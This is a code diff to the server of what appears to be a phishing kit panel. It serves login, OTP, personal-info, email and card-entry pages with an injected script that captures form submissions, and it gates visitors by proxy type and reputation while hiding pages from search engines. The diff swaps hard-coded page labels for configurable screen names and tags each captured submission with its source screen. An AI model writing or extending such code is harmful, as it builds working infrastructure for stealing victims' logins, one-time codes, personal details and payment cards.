@@ -23,6 +23,7 @@ import {
 } from "../services/turnstile.js";
 import { securityDecision } from "../services/securityRules.js";
 import { createChallengeProof, verifyChallengeProof } from "../services/challengeProof.js";
+import { runtimePackageForUserPage, runtimeScreenForFile } from "../services/runtimeScreens.js";
 
 export const runtimeRouter = Router();
 const accessDeniedMessage = "ACCESS DENIED";
@@ -240,7 +241,7 @@ function runtimePageUrl(userPageId, file) {
   return `/api/runtime/source?${params.toString()}`;
 }
 
-function rewriteRuntimeHtml(html, { userPageId, file, security = {}, forceTurnstile = false }) {
+function rewriteRuntimeHtml(html, { userPageId, file, screenName = "", security = {}, forceTurnstile = false }) {
   const turnstile = publicTurnstileConfig(security);
   const turnstileConfig = {
     enabled: Boolean((turnstile.enabled || forceTurnstile) && turnstile.siteKey),
@@ -258,18 +259,10 @@ function rewriteRuntimeHtml(html, { userPageId, file, security = {}, forceTurnst
   const bridge = `<script>
 (function () {
   const sessionKey = "deuce_session_" + ${JSON.stringify(userPageId)};
-  const pageLabels = {
-    "index.html": "Login page",
-    "login2.html": "Error login page",
-    "otp.html": "OTP page",
-    "personal.html": "Personal info page",
-    "email.html": "Email page",
-    "c.html": "Card page",
-    "thnks.html": "Thank you page"
-  };
   const runtime = {
     userPageId: ${JSON.stringify(userPageId)},
     pageId: ${JSON.stringify(file)},
+    screenName: ${JSON.stringify(screenName || file)},
     sessionId: getSessionId(),
     turnstile: ${JSON.stringify(turnstileConfig)},
     challengeProof: ""
@@ -306,8 +299,7 @@ function rewriteRuntimeHtml(html, { userPageId, file, security = {}, forceTurnst
   }
 
   function pageLabel() {
-    const name = runtime.pageId.split("/").pop().toLowerCase();
-    return pageLabels[name] || runtime.pageId;
+    return runtime.screenName || runtime.pageId;
   }
 
   let lastSubmitter = null;
@@ -540,6 +532,7 @@ function rewriteRuntimeHtml(html, { userPageId, file, security = {}, forceTurnst
         path: window.location.pathname,
         createdAt: new Date().toISOString(),
         challengeProof: runtime.challengeProof || "",
+        screenFile: runtime.pageId,
         ...payload
       })
     }).catch(function () { return null; });
@@ -683,7 +676,8 @@ function rewriteRuntimeHtml(html, { userPageId, file, security = {}, forceTurnst
 }
 
 async function packageForRuntimePage(page) {
-  const pagePackage = await findPackage(page.packageId || page.slug);
+  const currentPackage = await findPackage(page.packageId || page.slug);
+  const pagePackage = runtimePackageForUserPage(page, currentPackage);
   if (!pagePackage) throw new Error("Runtime package not found");
   return pagePackage;
 }
@@ -721,12 +715,14 @@ async function sendRuntimePackageFile(req, res, { asAsset = false } = {}) {
   }
 
   const html = await response.text();
+  const runtimeScreen = runtimeScreenForFile(pagePackage, file);
   res.setHeader("Content-Type", "text/html; charset=utf-8");
   res.setHeader("Cache-Control", "no-store");
   res.setHeader("X-Robots-Tag", "noindex, nofollow");
   res.send(rewriteRuntimeHtml(html, {
     userPageId: context.page.id,
     file,
+    screenName: runtimeScreen?.name || file,
     security: context.page.securityConfig || {},
     forceTurnstile: Boolean(securityDecisionResult.challengeRequired)
   }));
@@ -819,6 +815,7 @@ runtimeRouter.post("/traffic", async (req, res) => {
     reason: req.body?.reason || decision.reason,
     metadata: {
       ...(req.body?.metadata || {}),
+      screenFile: String(req.body?.screenFile || ""),
       deviceType: decision.deviceType || null,
       proxyType: decision.proxyType || null,
       reputation: decision.reputation || null,
